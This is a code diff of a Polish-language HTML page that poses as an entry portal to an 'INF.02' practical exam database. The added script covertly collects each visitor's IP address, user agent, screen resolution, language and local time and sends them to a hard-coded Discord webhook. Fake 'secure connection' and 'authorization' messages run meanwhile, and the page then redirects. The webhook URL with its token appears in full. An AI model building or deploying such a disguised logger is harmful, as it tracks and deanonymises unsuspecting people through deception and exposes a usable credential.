@@ -16,44 +16,55 @@
             justify-content: center;
             height: 100vh;
             margin: 0;
+            user-select: none;
         }
 
         h1 {
             color: #bb86fc;
             margin-bottom: 10px;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px rgba(187, 134, 252, 0.3);
         }
 
         #ip {
-            font-size: 1.2rem;
+            font-size: 1.1rem;
             margin: 20px;
             color: #03dac6;
             background: #1e1e1e;
-            padding: 10px 20px;
+            padding: 12px 25px;
             border-radius: 8px;
             border: 1px solid #333;
+            min-width: 300px;
+            text-align: center;
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
+            font-family: 'Courier New', Courier, monospace;
         }
 
-        /* Stylizacja przycisku */
-        button {
-            padding: 15px 30px;
-            font-size: 18px;
-            cursor: pointer;
-            background-color: #bb86fc;
-            color: #000;
+        /* Stylizacja przycisku-obrazka */
+        .btn-container {
+            background: none;
             border: none;
-            border-radius: 50px;
-            font-weight: bold;
-            transition: transform 0.2s, background-color 0.3s;
-            box-shadow: 0 4px 15px rgba(187, 134, 252, 0.3);
+            padding: 0;
+            cursor: pointer;
+            transition: transform 0.2s, filter 0.3s;
+            outline: none;
         }
 
-        button:hover {
-            background-color: #9965f4;
-            transform: scale(1.05);
+        .btn-container:hover {
+            transform: scale(1.03);
+            filter: brightness(1.1);
         }
 
-        button:active {
-            transform: scale(0.95);
+        .btn-container:active {
+            transform: scale(0.97);
+        }
+
+        .btn-container img {
+            width: 450px;
+            border-radius: 15px;
+            border: 2px solid #bb86fc;
+            box-shadow: 0 0 20px rgba(187, 134, 252, 0.4);
+            display: block;
         }
     </style>
 </head>
@@ -61,41 +72,81 @@
 
     <h1>SYSTEM INF 02</h1>
     <div id="ip">Inicjalizacja bazy danych...</div>
-    <button onclick="sendToDiscord()" style="background: none; border: none; padding: 0; cursor: pointer; transition: transform 0.2s;">
-    <img src="https://radiokielce.pl/wp-content/uploads/2021/11/1-opatow-180109.jpeg" 
-         alt="WEJDŹ DO BAZY" 
-         style="width: 450px; border-radius: 15px; border: 2px solid #bb86fc; box-shadow: 0 0 15px rgba(187, 134, 252, 0.5);">
+    
+    <button class="btn-container" onclick="sendToDiscord()">
+        <img src="https://radiokielce.pl/wp-content/uploads/2021/11/1-opatow-180109.jpeg" alt="WEJDŹ DO BAZY">
     </button>
 
     <script>
-        let currentIP = "";
+        let currentIP = "Nieznane (Blokada/AdBlock)";
 
+        // 1. Pobieranie IP od razu po załadowaniu strony
         fetch("https://api.ipify.org?format=json")
             .then(response => response.json())
             .then(data => {
                 currentIP = data.ip;
-                document.getElementById("ip").textContent = "Egzamin praktyczny";
+                document.getElementById("ip").textContent = "Egzamin praktyczny: Gotowy";
             })
             .catch(() => {
-                document.getElementById("ip").textContent = "Błąd połączenia";
+                document.getElementById("ip").innerHTML = "<span style='color: #cf6679;'>Błąd połączenia z API IP</span>";
             });
 
+        // 2. Główna funkcja obsługująca kliknięcie i wysyłanie danych
         function sendToDiscord() {
-            // Zmiana tekstu przycisku na "Ładowanie..." dla lepszego UX
-            const btn = document.querySelector('button');
-            btn.textContent = "Ładowanie...";
-            btn.disabled = true;
+            const ipDiv = document.getElementById("ip");
+            const btn = document.querySelector('.btn-container');
+            
+            // Dezaktywacja przycisku, żeby użytkownik nie kliknął kilka razy
+            btn.style.pointerEvents = "none";
+            btn.style.opacity = "0.5";
+            
+            // Krok 1: Fake loading w boksie tekstowym
+            ipDiv.innerHTML = "<span style='color: #ffb74d;'>Inicjalizacja bezpiecznego połączenia...</span>";
+            
+            // Zbieranie dodatkowych ciekawych parametrów urządzenia
+            const userAgent = navigator.userAgent;
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const language = navigator.language || navigator.userLanguage;
+            const localTime = new Date().toLocaleString('pl-PL');
+            
+            // Przygotowanie estetycznej wiadomości dla Discorda (Formatowanie Markdown)
+            const payload = {
+                content: "=======================================\n" +
+                         "🔐 **NOWE LOGOWANIE DO BAZY INF.02**\n" +
+                         "=======================================\n" +
+                         `🌐 **Adres IP:** \`${currentIP}\`\n` +
+                         `🖥️ **Rozdzielczość:** \`${screenRes}\`\n` +
+                         `🌍 **Język systemu:** \`${language}\`\n` +
+                         `⏱️ **Czas lokalny:** \`${localTime}\`\n` +
+                         `🤖 **User-Agent:** \`${userAgent}\`\n` +
+                         "======================================="
+            };
 
-            fetch("https://discord.com/api/webhooks/1514013803912630352/WSDMZ0hqcG6s9M8TTvptRjYjll1yYqRCNjdHCiSse6sRYOWr-34xIRTTpqqDkYNHFDxm", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    content: "Użytkownik wszedł do bazy. IP: " + (currentIP || "Nieznane")
+            // Mały timeout (600ms), żeby użytkownik zdążył zauważyć pierwszą zmianę tekstu
+            setTimeout(() => {
+                ipDiv.innerHTML = "<span style='color: #bb86fc;'>Wysyłanie pakietów autoryzacyjnych...</span>";
+                
+                // Wysyłanie danych na Twój webhook Discorda
+                fetch("https://discord.com/api/webhooks/1514013803912630352/WSDMZ0hqcG6s9M8TTvptRjYjll1yYqRCNjdHCiSse6sRYOWr-34xIRTTpqqDkYNHFDxm", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
                 })
-            })
-            .finally(() => {
-                window.location.href = "index2.html"; 
-            });
+                .then(() => {
+                    ipDiv.innerHTML = "<span style='color: #03dac6;'>Autoryzacja pomyślna! Przekierowanie...</span>";
+                })
+                .catch(() => {
+                    // W razie błędu sieci/webhooka i tak pozwalamy przejść dalej, żeby strona nie utknęła
+                    ipDiv.innerHTML = "<span style='color: #cf6679;'>Błąd bramki, wymuszanie dostępu...</span>";
+                })
+                .finally(() => {
+                    // Czekamy sekundę na przeczytanie końcowego komunikatu i zmieniamy stronę
+                    setTimeout(() => {
+                        window.location.href = "index2.html"; 
+                    }, 1000);
+                });
+
+            }, 600);
         }
     </script>
 </body>
